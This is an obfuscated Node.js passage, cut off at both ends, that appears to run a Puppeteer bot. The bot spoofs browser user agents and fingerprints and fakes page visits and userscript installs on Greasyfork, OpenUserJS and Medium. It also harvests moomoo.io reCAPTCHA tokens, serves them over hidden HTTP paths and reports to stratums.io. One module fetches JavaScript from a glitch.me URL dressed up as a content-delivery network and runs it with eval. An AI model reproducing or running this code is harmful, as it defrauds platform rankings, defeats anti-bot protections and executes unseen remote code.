    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + a2(0x19) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a1(0xb) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': a1(0x14) + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a1(0xb) + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + a2(0xa),
    'Mozilla/5.' + '0\x20(Linux;\x20' + a2(0x9) + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + a0(0x2, '4bkb') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    a1(0x4) + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + a2(0x1b) + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + a1(0x1e) + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1d * 0x8f + 0x17f6 + -0x2829
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a3 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * 0x2378 + 0x3 * -0x562 + -0x1 * 0x1352)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xce5 + 0x16f + -0x29 * -0x4a), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1ef * -0x11 + 0x1 * -0x93d + -0x4a6 * 0x5), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xa82 + 0x17e1 + -0xd5f * 0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x5 * -0x593 + 0x12d + 0x1ab2; w < getRandomInt(-0xf79 + 0x1a * 0xcb + -0x292 * 0x2, 0x1d5a + -0xb * 0x5a + -0x1977); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x19d33 + 0x10fac + -0x1c27f);
        }
      }();
    }, -0x22e * -0x6 + -0x3 * 0x1d2 + -0x39d * 0x2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x13c6 + -0x1f8 + 0x15be;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x2 * -0x443 + -0x11d * 0xb + 0x1 * 0x3b9, 0x20f * -0xa + -0x46f + -0x5 * -0x50b)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xa031 + 0x6772 + -0x3 * 0x30d1);
    }, -0x1492 + 0x824 * -0x1 + 0x1d1a), doFlags['doWhitepag' + a3(0x1f)] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x2596 + -0x8 * -0x4b1 + -0xc85 * 0x6;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xcf1 * -0x1 + 0x189d + 0xc), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1 * -0x1e57 + -0x213 + 0x12 * 0x1cd), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xb0b64 + -0x32a1b * -0x7 + -0x137681);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x5b * 0x31 + -0x24 * 0x2 + 0x1217);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x116f * -0x1 + 0x7f * -0x10 + -0x1a27 * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3974 + 0xb * 0x216 + -0x2 * -0x2109);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = c,
    a5 = d;
  async function f() {
    const a4 = d,
      k = h['random'](),
      m = k[a4(0x18)]('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x286 + -0xc14 * 0x1 + 0x98f) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xfcf + 0xe86 + 0x14a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1bb7 + -0xd37 + -0xe80, D['indexOf']('\x20'));
        return B ? E['slice'](-0x2133 * 0x1 + -0x1 * 0xaef + 0x2c22, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x127e + 0x4b9 + 0x1 * 0xfd9),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x24c8 + -0x10d0 + 0x251 * 0x28),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + a5(0x16) + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + a5(0x1) + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + a6(0x11) + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
